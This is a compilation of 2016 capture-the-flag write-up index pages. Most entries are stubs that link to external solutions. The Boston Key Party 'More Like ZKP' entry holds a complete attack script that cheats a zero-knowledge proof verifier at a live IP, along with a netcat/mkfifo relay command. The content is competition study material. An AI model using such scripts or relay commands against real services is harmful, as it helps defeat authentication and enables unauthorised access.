Go [there](https://3magic.asis-ctf.ir/3magic/) and find the flag.

## Write-up

(TODO)

## Other write-ups and resources

* https://blog.stypr.com/2016/05/09/asis2016-writeup/
* https://youtu.be/v_gl73yUSxw
* https://thegoonies.rocks/asis-ctf-three-magic-web/
# Backdoor CTF : baby-200

**Category:** Crypto
**Points:** 200
**Solves:** 9
**Description:**

> z3r0c00l has a safe repository of files. The filename is signed using z3r0c00l's private key (using the PKCS-1 standard).
> 
> Anyone willing to read a file, has to ask for a signature from z3r0c00l. But z3r0c00l is currently unavailable.
> 
> Can you still access a file named "flag" on z3rc00l's repository?
> 
> nc hack.bckdr.in 9001
> 
> Created by: Punit Dhoot
> 
> No. of Correct Submissions: 9
> 


## Write-up

(TODO)

## Other write-ups and resources

* https://grocid.net/2016/06/05/backdoorctf16-baby/
# Backdoor CTF : collision-course-350

**Category:** Crypto
**Points:** 350
**Solves:** 7
**Description:**

> In today's world, hash collisions are becoming more and more popular. That is why, one must rely on standardized hashing techniques, such as bcrypt. However, n00bster shall never learn, and he has implemented his own hash function which he proudly calls foobar. Attached is an implementation of the hash function and a file with which you are supposed to find a collision. He believes that you will not be able to find a collision for the file, especially since he hasn't even given you the hashing algorithm, but has packaged it as a black box application. Prove to him that he is wrong.
> 
> 
> Note: Multiple collisions are possible, but only one of them is a valid flag.
> 
> You will realize you've gotten it once you do.
> 
> Created by: Jay Hitesh Bosamiya
> 
> No. of Correct Submissions: 7
> 


## Write-up

(TODO)

## Other write-ups and resources

* https://grocid.net/2016/06/05/backdoorctf16-collision-course/
* https://github.com/p4-team/ctf/tree/master/2016-06-04-backdoor-ctf/crypto_collision_course
# Backdoor CTF : crc-250

**Category:** Crypto
**Points:** 250
**Solves:**  9
**Description:**

> Backdoor user IamLupo wanted to submit his challenge for BackdoorCTF16 but he was struck by lightening and his challenge file shattered into 26 pieces. We want you to recover it for us (and maybe get the flag while you do it). Thanks in advance! Here is the zipped file: 
> 
> <http://hack.bckdr.in/CRC/challenge.zip>
> 
> Created by: IamLupo
> 
> No. of Correct Submissions: 9
> 


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/p4-team/ctf/tree/master/2016-06-04-backdoor-ctf/crypto_crc
* http://www.codilime.com/backdoorctf16-crc/
# Backdoor CTF : forge-350

**Category:** Crypto
**Points:** 350
**Solves:** 6
**Description:**

> Mandogs are about to take over Backdoor. Help us defeat them. Here: <http://hack.bckdr.in/FORGE>
> 
> Created by: Ashish Chaudhary
> 
> No. of Correct Submissions: 6
> 


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/p4-team/ctf/tree/master/2016-06-04-backdoor-ctf/crypto_forge
# Backdoor CTF : mindblown-150

**Category:** Crypto
**Points:** 150
**Solves:** 23
**Description:**

> Chintu has secured his flag behind a secure auth. We managed to get the authentication logic of the system. Can you help us get his flag from here. Bruteforce is not needed.
> 
> Created by: Amanpreet Singh
> 
> No. of Correct Submissions: 23


## Write-up

(TODO)

## Other write-ups and resources

* http://b0tchsec.com/2016/backdoorctf/mindblown
* http://rawsec.ml/en/writeups-crypto-mindblown/
* https://github.com/p4-team/ctf/tree/master/2016-06-04-backdoor-ctf/crypto_mindblown
# Backdoor CTF : debug-30

**Category:** Misc
**Points:** 30
**Solves:** 34
**Description:**

> Take sha256 of string obtained.
> 
> <http://hack.bckdr.in/DEBUG/debug32>
> 
> Created by: Divij Bindlish
> 
> No. of Correct Submissions: 34
> 


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Backdoor CTF : incomplete-600

**Category:** Misc
**Points:** 600
**Solves:** 13
**Description:**

> We were able to intercept some data, which is supposed to contain the flag. But the data doesn't seem complete. Can you help us out? 
> 
> <http://hack.bckdr.in/INCOMPLETE/secret.pcapng>
> 
> Created by: Tanmay Tiwari
> 
> No. of Correct Submissions: 13
> 


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/p4-team/ctf/tree/master/2016-06-04-backdoor-ctf/for_incomplete
# Backdoor CTF : jigsaw-150

**Category:** Misc
**Points:** 150
**Solves:** 9
**Description:**

> cr4wl3r was always found solving jigsaw puzzle. Let us know why he solves so many jigsaws by solving the same. Get the puzzle pieces here
> 
> 
> Hint: The pattern on letter seems suspicious
> 
> Created by: Aryan Raj
> 
> No. of Correct Submissions: 9


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/p4-team/ctf/blob/master/2016-06-04-backdoor-ctf/misc_jigsaw/README.md
# Backdoor CTF : truncate-600

**Category:** Misc
**Points:** 600
**Solves:** 0
**Description:**

> Follow the numbers... And remember X marks the spot.
> 
> nc dc.bckdr.in 411
> 
> Created by: Divij Bindlish
> 
> No. of Correct Submissions: 0
> 


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Backdoor CTF : isolve-200

**Category:** Ppc
**Points:** 200
**Solves:** 8
**Description:**

> nc hack.bckdr.in 7070
> 
> Created by: Amanpreet Singh
> 
> No. of Correct Submissions: 8


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/p4-team/ctf/tree/master/2016-06-04-backdoor-ctf/ppc_isolve
# Backdoor CTF : enter-the-matrix-350

**Category:** Pwn
**Points:** 350
**Solves:** 8
**Description:**

> Can you reach Zion and find the flag? You can download a copy of the Matrix to play with here, but the flag can only be found on Zion, through the real Matrix at 
> 
> nc hack.bckdr.in 9004
> 
> 
> Note: The flag is of the format CTF{flag}
> 
> Created by: Jay Hitesh Bosamiya
> 
> No. of Correct Submissions: 8
> 


## Write-up

(TODO)

## Other write-ups and resources

* http://s0ngsari.tistory.com/entry/Backdoor-CTF-Enter-the-Matrix
# Backdoor CTF : worst-pwn-ever-100

**Category:** Pwn
**Points:** 100
**Solves:** 27
**Description:**

> tocttou is an enviornmentalist. But some say he has a vicious motive and he uses nature to hide his dark side. We found a weird shell on his amazon (pun inteded) web services. Can you tell us what is he upto? Tip: he might shut down the machine if he notices you - and he will (maybe in 45 seconds). Access: nc hack.bckdr.in 9008
> 
> Created by: Ashish Chaudhary
> 
> No. of Correct Submissions: 27
> 


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/nikhil96sher/CTF-Writeups/tree/master/Backdoor-CTF-2016/WORST-PWN-EVER
* http://b0tchsec.com/2016/backdoorctf/worst-pwn-ever
* https://ctf.rip/backdoor16-worstpwnever/
* https://github.com/p4-team/ctf/tree/master/2016-06-04-backdoor-ctf/pwn_worst
* http://www.codilime.com/backdoorctf16-worst-pwn-ever/
* http://bryceandress.github.io/2016/06/11/Worst-Pwn-Ever.html
# Backdoor CTF write-ups

* <TODO>
* [Scoreboard](TODO) or [local alternative](TODOLOCAL)

## Repo-local write-ups

* none yet

## External write-ups only

* [pwn/worst-pwn-ever-100](pwn/worst-pwn-ever-100)
* [pwn/enter-the-matrix-350](pwn/enter-the-matrix-350)
* [ppc/isolve-200](ppc/isolve-200)
* [misc/debug-30](misc/debug-30)
* [misc/jigsaw-150](misc/jigsaw-150)
* [misc/incomplete-600](misc/incomplete-600)
* [misc/truncate-600](misc/truncate-600)
* [crypto/mindblown-150](crypto/mindblown-150)
* [crypto/crc-250](crypto/crc-250)
* [crypto/baby-200](crypto/baby-200)
* [crypto/forge-350](crypto/forge-350)
* [crypto/collision-course-350](crypto/collision-course-350)
* [stego/dtune-70](stego/dtune-70)
* [stego/busybee-150](stego/busybee-150)
* [stego/lossless-100](stego/lossless-100)
* [stego/television-150](stego/television-150)
* [web/clue-200](web/clue-200)
* [web/imagelover-200](web/imagelover-200)
* [web/weird-auth-2-200](web/weird-auth-2-200)
* [web/infinite-paths-100](web/infinite-paths-100)

## Missing write-ups

* none yet
# Backdoor CTF : busybee-150

**Category:** Stego
**Points:** 150
**Solves:** 30
**Description:**

> A deadly virus is killing bees in Busybee's village Busybox, India. Unfortuantely, you have to go to the village to fight the infection. Get the flag virus out of the infected files. 
> 
> Village address: <http://hack.bckdr.in/BUSYBEE/infected.tar>
> 
> Created by: Ashish Chaudhary
> 
> No. of Correct Submissions: 30
> 


## Write-up

(TODO)

## Other write-ups and resources

* http://b0tchsec.com/2016/backdoorctf/busybee
* https://github.com/jcfs/backdoorctf-2016/blob/master/busybee/README.md
# Backdoor CTF : dtune-70

**Category:** Stego
**Points:** 70
**Solves:** 30
**Description:**

> Vector recorded this audio when Gill Bates was opening his/her vault and Gru stole this recording from him (stealing from a thief ain't a crime, right?). Help Gru decode this message so that he can ...(Use your imagination) 
> 
> <http://hack.bckdr.in/DTUNE/Dtune.wav>
> 
> Created by: Vishrut Kumar Mishra
> 
> No. of Correct Submissions: 30
> 


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/chamli/Write_Up_Ctf/blob/master/backdoorctf2016/Dtune_Misc.md
* https://github.com/p4-team/ctf/tree/master/2016-06-04-backdoor-ctf/misc_dtune
* http://www.codilime.com/backdoorctf16-dtune/
# Backdoor CTF : lossless-100

**Category:** Stego
**Points:** 100
**Solves:** 18
**Description:**

> d4rth used his dirty methods to hide a secret in a png file. He is cleverly trying to divert your focus from challenge, but the force is strong with you. Now extract the flag from these images, my young padawan.
> 
> <http://hack.bckdr.in/LOSSLESS/original.png>
> 
> <http://hack.bckdr.in/LOSSLESS/encrypted.png>
> 
> Created by: Arpit Singla
> 
> No. of Correct Submissions: 18
> 


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/nikhil96sher/CTF-Writeups/tree/master/Backdoor-CTF-2016/LOSSLESS
* http://b0tchsec.com/2016/backdoorctf/lossless
* http://www.codilime.com/backdoorctf16-lossless/
# Backdoor CTF : television-150

**Category:** Stego
**Points:** 150
**Solves:** 3
**Description:**

> We have provided you our television which ain't working for some time. Something must be messing it up. Get the television at here. Submit SHA256 of the flag obtained.
> 
> Created by: Amanpreet Singh
> 
> No. of Correct Submissions: 3


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/p4-team/ctf/blob/master/2016-06-04-backdoor-ctf/stegano_television/README.md
# Backdoor CTF : clue-200

**Category:** Web
**Points:** 200
**Solves:** 7
**Description:**

> Vampire has started recruiting hackers for his new team. To filter people, he has given a clue somehwhere here. If you think you are capable enough to join him find the flag and submit its SHA-256 hash.
> 
> Hint: Vampire is fond of git and Github
> 
> Created by: Dhaval Kapil
> 
> No. of Correct Submissions: 7


## Write-up

(TODO)

## Other write-ups and resources

* http://b0tchsec.com/2016/backdoorctf/clue
* https://github.com/antoniovilarinholopes/Backdoor2016/tree/master/clue
# Backdoor CTF : imagelover-200

**Category:** Web
**Points:** 200
**Solves:** 28
**Description:**

> Find imagelover here
> 
> Created by: Amanpreet Singh
> 
> No. of Correct Submissions: 28
> 


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/nikhil96sher/CTF-Writeups/tree/master/Backdoor-CTF-2016/IMAGELOVER
* http://b0tchsec.com/2016/backdoorctf/imagelover
# Backdoor CTF : infinite-paths-100

**Category:** Web
**Points:** 100
**Solves:** 20
**Description:**

> cr4wl3r(a basillisk) once got pissed off with feignix(fawkes the feignix) and challenged him to find the flag that was hidden in the mysterious tunnels inside his lair, the chamber of secrets. feignix now flies inside the underground tunnels attempting to find the flag. See if you(Tom) can get to the flag first with some magic tricks. Will you be able to solve this Marvelous Riddle Tom? Go here
> 
> Created by: Arpit Singla
> 
> No. of Correct Submissions: 20
> 


## Write-up

(TODO)

## Other write-ups and resources

* http://b0tchsec.com/2016/backdoorctf/infinite-paths
* https://github.com/p4-team/ctf/blob/master/2016-06-04-backdoor-ctf/web_infinite_paths/README.md
# Backdoor CTF : wierd-auth-2-200

**Category:** Web
**Points:** 200
**Solves:** 17
**Description:**

> Vampire is keen on hacking wierd authentication schemes. He recently pwned this.
> 
> The source of submit.php is here
> 
> Created by: Dhaval Kapil
> 
> No. of Correct Submissions: 17


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/jcfs/backdoorctf-2016/blob/master/weird-auth2/README.md
#bctf 2016 special_rsa writeup

###*Category:* Reverse *Points:* 200 

> While studying and learning RSA, I knew a new form of encryption/decryption with the same safety as RSA.
>
> I encrypted msg.txt and got msg.enc as an example for you.
>
> $ python special_rsa.py enc msg.txt msg.enc
>
> Can you recover flag.txt from flag.enc?

## write-up

(TODO)

## Other write-ups and resources
* <https://cryptsec.wordpress.com/2016/03/21/bctf-2016-write-up-special-rsa-crypto-200/>
* <http://ctf.publog.jp/archives/1054247932.html> (Japanese)

#bctf 2016 bcloud writeup

###*Category:* Exploit *Points:* 200 


## write-up

(TODO)

## Other write-ups and resources
* <http://shift-crops.hatenablog.com/entry/2016/03/21/171249> (Japanese)
* <http://rex.sex/ctf/2016/bctf/bcloud/ex.py> (@rex2er)
* <http://uaf.io/exploitation/2016/03/20/BCTF-bcloud.html>
#bctf 2016 ruin writeup

###*Category:* Exploit *Points:* 200 


## write-up

(TODO)

## Other write-ups and resources
* <http://shift-crops.hatenablog.com/entry/2016/03/21/171249> (Japanese)
* <http://rex.sex/ctf/2016/bctf/ruin/ex.py> (@rex2er)
* <http://gmiru.com/writeups/bctf-ruin/>
* <http://uaf.io/exploitation/2016/03/20/BCTF-ruin.html>
#bctf 2016 cat video writeup

###*Category:* Forensics *Points:* 150 

###How we used ffmpeg and java to do a simple video forensics analysis.

We started out looking at a very scrambled video of something that might be the outline of a cat, and something that looked like two rows of text the first few seconds.

We guessed that the lines of text was the flag, and dumped the video into individual frames with ffmpeg:

> ffmpeg -i catvideo-497570b7e2811eb52dd75bac9839f19d7bca5ef4.mp4 -vf fps=30  pics_in/%04d.bmp

Once we had that it was easy to experiment with a couple of different filters, and by going over the 100 first frames, and record the pixel positions of all pixels where the lowest bit was flipped from one frame to the next.

Since the first seconds was a fade-in of the text in the video we were lucky and this technique gave us a clear picture of the title text of what turned out to be a normal cat video: https://www.youtube.com/watch?v=N-CSBFdDZsw

Back to the drawing board it was, and the next thing that was tried was to play with filters in gimp, Kent on our team found out that the flag became visible if you used the differance method on two of the images where one was later in the movie.

For completeness sake we implemented it in code also, we took the first image and xor'ed all images in the stream with that one, and then wrote them back to disk (implemented here: https://git.tazj.in/hackeriet/bctf-2016/src/master/catvideo/src/main/java/no/hackeriet/App.java ).

Once that was done we could reassemble it into a video with ffmpeg:

> ffmpeg -y -f image2 -i pics_out/%04d.png -r 10 -vcodec libx264 -vb 4096k -acodec null event.mp4

written by Alexander Kjäll

published here: https://projects.hackeriet.no/news/16


## Other write-ups and resources
* <http://veganzombies.org/writeups/2016/03/21/BCtf-catvideo.html>
* <https://github.com/WesternCyber/CTF-WriteUp/blob/master/2016/BCTF/Forensics150.md>
* <https://projects.hackeriet.no/news/16>
* <http://fadec0d3.blogspot.com/2016/03/bctf-2016-catvideo-150.html>
* <https://github.com/DMArens/CTF-Writeups/tree/master/2016/BCTF/Forensics150>
* <http://err0r-451.ru/2016-bctf-forensic-catvideo-150-pts/>
* [Russian](http://countersite.org/articles/steganography/68-bctf-2016-stego-catvideo.html)
#bctf 2016 upload writeup

###*Category:* Forensics *Points:* 200 

> Where are the files I just uploaded?
>
> The files in the links below are the same, download any of them to begin hacking!
>
> disk.img.xz - google drive link
>
> disk.img.xz - dropbox link
>
> disk.img.xz - baidu link


## write-up

(TODO)

## Other write-ups and resources

* https://www.xil.se/post/bctf-2016-upload-forensics-kbeckmann/

#bctf 2016 hsab writeup

###*Category:* Misc *Points:* 250 

> nc 104.199.132.199 2222

## write-up

(TODO)

## Other write-ups and resources

* <https://ctf.rip/bctf-2016-hsab-misc-category-challenge/>
* <https://github.com/QuokkaLight/write-ups/blob/master/bctf-2016/hsab.md>
* <https://github.com/DMArens/CTF-Writeups/tree/master/2016/BCTF/Misc200>
* <https://github.com/p4-team/ctf/tree/master/2016-03-19-bctf/misc_200_hsab>
#bctf 2016 zerodaystore writeup

###*Category:* Misc *Points:* 200 


## write-up

(TODO)

## Other write-ups and resources

* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/BCTF/misc/zerodaystore>
* <https://github.com/p4-team/ctf/blob/master/2016-03-19-bctf/misc_200_zerodaystore/README.md>
# BCTF 2016 write-ups

## Repo-local write-ups

* [forensics/catvideo-150](forensics/catvideo-150)

## External write-ups only

* [forensics/upload-200](forensics/upload-200)
* [exploit/bcloud-200](exploit/bcloud-200)
* [exploit/ruin-200](exploit/ruin-200)
* [crypto/special_rsa-200](crypto/special_rsa-200)
* [reverse/sif-350](reverse/sif-350)
* [misc/hsab-250](misc/hsab-250)
* [misc/zerodaystore-200](misc/zerodaystore-200)

## Missing write-ups

(TODO)

#bctf 2016 sif writeup

###*Category:* Reverse *Points:* 350


## write-up

(TODO)

## Other write-ups and resources
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/BCTF/reversing/sif>

# Blaze CTF 2016 : dmail-420

**Category:** Pwn
**Points:** 420
**Solves:** 
**Description:**

dmail is dealermail, its super secret email for only the top dealers

Host is ubuntu 14.04

107.170.17.158 4201


## Write-up

(TODO)

## Other write-ups and resources

* https://0xabe.io/ctf/exploit/2016/04/24/BlazeCTF-dmail.html
* https://github.com/TeamBP/write-ups/tree/master/2016/blazectf/dmail
* http://www.hamidx9.ir/blog/2016/01/19/blazectf-2016-writeups.html
# Blaze CTF 2016 : xenocryst-420

**Category:** Pwn
**Points:** 420
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/ymgve/ctf-writeups/tree/master/blazectf2016/xenocryst
# Blaze CTF 2016 write-ups

* <TODO>
* [Scoreboard](http://ctf.420blaze.in/) or [local alternative](scoreboard)

## Repo-local write-ups

* none yet

## External write-ups only

* [pwn/xenocryst-420](pwn/xenocryst-420)
* [pwn/dmail-420](pwn/dmail-420)
* [web/postboard-420](web/postboard-420)

## Missing write-ups

* none yet
# Blaze CTF 2016 : postboard-420

**Category:** Web
**Points:** 420
**Solves:** 
**Description:**

I made a post on this new forum, but the memes were so dank that the admin disabled it! I managed to get my hands on a broken binary for the server, can you figure out how to pwn it and retrieve my memes?

46.101.248.243 1337

NOTE: if you are getting server 500 errors, clear your cookies

## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/TeamBP/write-ups/tree/master/2016/blazectf/postboard
* http://security.szurek.pl/blazectf-2016-postboard-writeup.html
* http://www.hamidx9.ir/solutions/2016/blazectf/postboard/
# Boston Key Party CTF : bobs-hat-4

**Category:** Crypto
**Points:**4 
**Solves:**73 
**Description:**

> Alice and Bob are close together, likely because they have a lot of things in common.  This is why Alice asked him a small *q*uestion, about something cooler than a wiener 


## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf.rip/boston-key-party-2016-bobs-hat-crypto/>
* [b01lers](https://b01lers.net/challenges/Boston%20Key%20Party%202016/Bob's%20Hat/91/)
* <http://err0r-451.ru/2016-bkpctf-crypto-bobs-hat-4-pts/>
# Boston Key Party CTF : des-ofb-2

**Category:** Crypto
**Points:**2 
**Solves:**189
**Description:**

> Decrypt the message, find the flag, and then marvel at how broken everything is. 


## Write-up

(TODO)

## Other write-ups and resources

* <https://0day.work/boston-key-party-ctf-2016-writeups/#desofb> 
* <https://cryptsec.wordpress.com/2016/03/07/boston-key-party-ctf-write-up-2016-des-ofb-crypto-2/>
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/BKPCTF/crypto/desofb>
* <https://github.com/Alpackers/CTF-Writeups/tree/master/2016/BostonKeyParty/Crypto/des-ofb>
* <https://github.com/p4-team/ctf/tree/master/2016-03-06-bkpctf/crypto_2_des_ofb>
# Boston Key Party CTF : gsilvis-counting-magic-9

**Category:** Crypto
**Points:**9
**Solves:**7 
**Description:**

> Here's a verification/decryption server:  gcm.ctf.bostonkey.party:32768 .  Get the GCM MAC key (the thing the server prints out on startup).  We've given you one valid ciphertext to get you started.  It has  iv: [102 97 110 116 97 115 116 105 99 32 105 118] and tag: [119 179] 


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Boston Key Party CTF : hamc_crc-5

**Category:** Crypto
**Points:**5 
**Solves:**43 
**Description:**

> We're trying a new mac here at BKP---HMAC-CRC. The hmac (with our key) of "zupe zecret" is '0xa57d43a032feb286'.  What's the hmac of "BKPCTF"?


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/raccoons-team/ctf/tree/master/2016-03-07-boston-key-party-ctf/crypto_5_hmac_crc>
* <https://github.com/DeliciousHorse/2016.03.BostonKeyParty/blob/master/hmac_crc.md>
* [b01lers](https://b01lers.net/challenges/Boston%20Key%20Party%202016/HMAC_CRC/93/)
* <http://andrewl.dreamhosters.com/lblog/2016-03-06_bostonkeyparty_hmac_crc_writeup/writeup.html>
# Boston Key Party CTF : ltseorg-4

**Category:** Crypto
**Points:**4 
**Solves:**93
**Description:**

> make some (charlie)hash collisions! ltseorg.bostonkey.party 5555 


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/BKPCTF/crypto/ltseorg> 
* <https://0day.work/boston-key-party-ctf-2016-writeups/#ltseorg>
* [b01lers](https://b01lers.net/challenges/Boston%20Key%20Party%202016/ltseorg/92/)
* <http://err0r-451.ru/bkpctf-crypto-ltseorg-4-pts/>
* <https://github.com/p4-team/ctf/tree/master/2016-03-06-bkpctf/crypto_4_ltseorg>
# Boston Key Party CTF 2016 : More Like ZKP

**Category:** Crypto
**Points:** 4 
**Description:** 

> We've made a zero-knowledge proof protocol for graph 3-coloring. 
Here are prover (52.86.232.163:32795) and verifier (52.86.232.163:32794) 
servers. 
Convince the verifier that you know the prover's graph-coloring! 
https://s3.amazonaws.com/bostonkeyparty/2016/48cdc8756b6a9a5052c6da2d061b9bd61d13a1fa.tgz

## Write-up

**by [LosFuzzys](https://hack.more.systems)**

The proof is based on a three-colored graph, where the graph was given,
but the colors not.

graph.txt:

```
# 683
129 495
129 613
1 2
2 489
2 507
3 507
3 495
495 613
215 489
215 613
...
```

In the proving step, the colors (AES encrypted) have to be sent to the 
verifier. The verifier selects one random edge, asks for the keys,
and checks if the vertices on the edge have the same color. 
If not, the process is repeated 1000 times. A successful proof is
rewarded with the flag.

```go
func handle_connection(conn net.Conn) {
    defer func() {
        e := recover()
        if e != nil {
            if uerr, ok := e.(UserError); ok {
                conn.Write([]byte(uerr.Error()))
            }
        }
        conn.Close()
    }()

    successes := 0
    for {
        // Get the colors
        ciphers := get_colors(conn)
        // Send a challenge (pair of vertices)
        v1, v2 := gen_challenge()
        send_challenge(conn, Edge{v1, v2})
        // Get the AES keys
        k1, k2 := get_keys(conn)
        if decrypt(ciphers[v1], k1) == decrypt(ciphers[v2], k2) {
            // Colors don't match!
            panic(UserError{"Those are the same color!"})
            return;
        }
        successes += 1
        if successes == THRESHOLD {
            // Okay, I believe you
            conn.Write([]byte("BKPCTF{" + flag + "}"));
            conn.Close()
            return
        }
    }
}
```

Our first try was to connect the prover and verifier with netcat:

```
mkfifo backpipe
nc 52.86.232.163 32794 0<backpipe | nc 52.86.232.163 32795 1>backpipe
```

But the prover sets some bytes, that the verifier doesn't accept. But
worse, the prover answers with random colors! So a complete new attempt
must be found.

Thanks to @meisterluk, we found out, that a SAT solver is useful for
graph three-coloring. There are two conditions, that have to be
satisfied:

* Every vertex has one of the three colors.
* Not the same color on one edge.

The SAT solver runs for less than a second until the colors are found.
All colors are encrypted with a static key (```MASTER_KEY```) and
then sent to the verifier. The step took some minutes, since several
megabytes have to be transmitted. The reason is, because the colors
have to be sent 1000 times.

Attack script:

```python
#!/usr/bin/env python2
from __future__ import print_function
from satispy import Variable, Cnf
from satispy.solver import Minisat
import socket
import struct
from Crypto.Cipher import AES

VERTICES = 683

def readGraphFile():
    graph_file = open('graph.txt', 'r')
    graph = []
    for line in graph_file:
        if line[0] != '#':
            nums = list(map(int, line[:-1].split(' ')))
            graph.append(nums)

    graph_file.close()
    return graph

graph = readGraphFile()

exp = Cnf()
c1 = dict()
c2 = dict()
c3 = dict()

# one of the three colors for a vertex
for vertex in range(VERTICES):
    c1[vertex] = Variable('edge%dhasColor1' % vertex)
    c2[vertex] = Variable('edge%dhasColor2' % vertex)
    c3[vertex] = Variable('edge%dhasColor3' % vertex)
    
    # one of three
    exp &= c1[vertex] | c2[vertex] | c3[vertex]
    exp &= c1[vertex] | -c2[vertex] | -c3[vertex]
    exp &= -c1[vertex] | c2[vertex] | -c3[vertex]
    exp &= -c1[vertex] | -c2[vertex] | c3[vertex]
    
# not same color on one edge
for edge in graph:
    begin = edge[0]
    end = edge[1]
    exp &= -c1[begin] | -c1[end]
    exp &= -c2[begin] | -c2[end]
    exp &= -c3[begin] | -c3[end]

# solve it
solver = Minisat()
solution = solver.solve(exp)

colors = [0] * VERTICES
if solution.success:
    print("Found a solution:")
    for vertex in range(VERTICES):
        if solution[c1[vertex]]:
            colors[vertex] = 1
        if solution[c2[vertex]]:
            colors[vertex] = 2
        if solution[c3[vertex]]:
            colors[vertex] = 3
    print(colors)
else:
    print("The expression cannot be satisfied")
    
    
# CHECK FOR ERRORS -----------------------------------------------------
error_detected = False
for edge in graph:
    if colors[edge[0]] == colors[edge[1]]:
        print(str(edge))
        error_detected = True
if error_detected == False:
    print("ok")
else:
    print("ERROR")


# CREATE ENCRYPTED COLORS ----------------------------------------------
MASTER_KEY = "0123456789ABCDEF"

colors_enc = []
for color in colors:
    cipher = AES.new(MASTER_KEY, AES.MODE_ECB, '')
    color = struct.pack("IIII", color, 0, 0, 0)
    colors_enc.append(cipher.encrypt(color))


# TCP TO VERIFIER ------------------------------------------------------
TCP_IP = '52.86.232.163'
TCP_PORT = 32794 # verifier
BLOCK_SIZE = 16
VERTICES = 683
FLAGSTART = "BKPCTF{"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
s.settimeout(60.0)

for i in range(1000):
    s.send("".join(colors_enc))
    challange = s.recv(8)
    cx = struct.unpack(">II", challange)
    print("%d: " % i, end="")
    print(cx)
    s.sendall(MASTER_KEY)
    s.sendall(MASTER_KEY)

resp = s.recv(50)
print(resp)
s.close()
```

Output:

```
0: (77, 355)
1: (548, 578)
2: (429, 624)
3: (138, 406)
...
996: (195, 661)
997: (385, 596)
998: (283, 411)
999: (7, 193)
BKPCTF{4c3b35aaade7843c8c97}
```

## Other write-ups and resources

* <https://losfuzzys.github.io/writeup/2016/03/30/bostonkeyparty-more-like-zkp/>
# Boston Key Party CTF : found-it-1

**Category:** Misc
**Points:** 
**Solves:** 
**Description:**

> BKPCTF{hello world} is the flag


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Boston Key Party CTF : lily.flac

**Category:** Misc
**Points:**2 
**Solves:**21 
**Description:**

> more than just a few bleebs ;) 


## Write-up

(TODO)

## Other write-ups and resources

* <https://gist.github.com/duckythescientist/5c63e646ce5ab14c8afd>
* <https://www.youtube.com/watch?v=Ccnoa7toR5w>
* <https://ctf.rip/boston-key-party-lily-flac-misc/>
* <https://github.com/p4-team/ctf/tree/master/2016-03-06-bkpctf/misc_2_lily_flac>
# Boston Key Party CTF : complex-calc-5

**Category:** Pwn
**Points:** 5
**Solves:** 74
**Description:**

> we've fixed a tiny bug!

` simplecalc.bostonkey.party 5500`


## Write-up

(TODO)

## Other write-ups and resources

* <https://grazfather.github.io/ctf/pwn/2016/03/06/BKP-PWN5-Complex-Calc.html>
* [b01lers](https://b01lers.net/challenges/Boston%20Key%20Party%202016/Complex%20Calc/94/)
* <https://0xabe.io/ctf/exploit/2016/03/07/Boston-Key-Party-pwn-Complex-Calc.html>
# Boston Key Party CTF : cookbook-6

**Category:** Pwn
**Points:**6
**Solves:**36
**Description:**

> 36 solves : pwn: a top chef wrote this cookbook for me but i think he has an extra secret recipe!

`cookbook.bostonkey.party 5000`


## Write-up

(TODO)

## Other write-ups and resources

* <https://gist.github.com/stephenR/cdfa396aa40c22a3180c> 
* <http://rex.sex/ctf/2016/bkp/cookbook.py>
* <https://gist.github.com/LiveOverflow/dadc75ec76a4638ab9ea#file-cookbook-py> (including 3 part video write-up)
* [b01lers](https://b01lers.net/challenges/Boston%20Key%20Party%202016/Cookbook/95/)
* <http://pwnexpoit.hol.es/2016/03/07/boston-key-party-ctf-2016-cookbook/>
* <https://github.com/unamer/ctf/blob/master/bkpctf2016/cookbook.py>
# Boston Key Party CTF : segsh-6

**Category:** Pwn
**Points:** 6
**Solves:** 28
**Description:**

`segsh.bostonkey.party 8888`

> flag lives in /home/segsh/flag 


## Write-up

(TODO)

## Other write-ups and resources

* <https://gist.github.com/isra17/1fa493ed016ac334b162> 
# Boston Key Party CTF : simple-calc-5

**Category:** Pwn
**Points:** 5
**Solves:** 186
**Description:**

> what a nice little calculator!

`simplecalc.bostonkey.party 5400`


## Write-up

(TODO)

## Other write-ups and resources

* <https://grazfather.github.io/ctf/pwn/2016/03/06/BKP-PWN5-Simple-Calc.html> 
* <http://hexfact0r.dk/2016/03/06/boston-key-party-ctf-2016-simple-calc/>
* <https://eugenekolo.com/blog/boston-key-party/#simplecalc>
* <https://github.com/VulnHub/ctf-writeups/blob/master/2016/boston-key-party/Simple%20Calc.md>
* <https://jkrshnmenon.wordpress.com/2016/03/07/simplecalc-bkp-ctf16-writeup/>
* [b01lers](https://b01lers.net/challenges/Boston%20Key%20Party%202016/Simple%20Calc/96/)
* <https://0xabe.io/ctf/exploit/2016/03/07/Boston-Key-Party-pwn-Simple-Calc.html>
* <https://github.com/unamer/ctf/blob/master/bkpctf2016/simplecalc.py>
# Boston Key Party CTF : spacerex-8

**Category:** Pwn
**Points:** 8 
**Solves:** 10
**Description:**

`spacerex.bostonkey.party 6666`


## Write-up

(TODO)

## Other write-ups and resources

* <https://gist.github.com/isra17/59732f76fc609b12bc09> 
# Boston Key Party CTF write-ups

* <TODO>
* [Scoreboard](TODO) or [local alternative](score.txt)

## Repo-local write-ups

* [misc/found-it-1](misc/found-it-1)
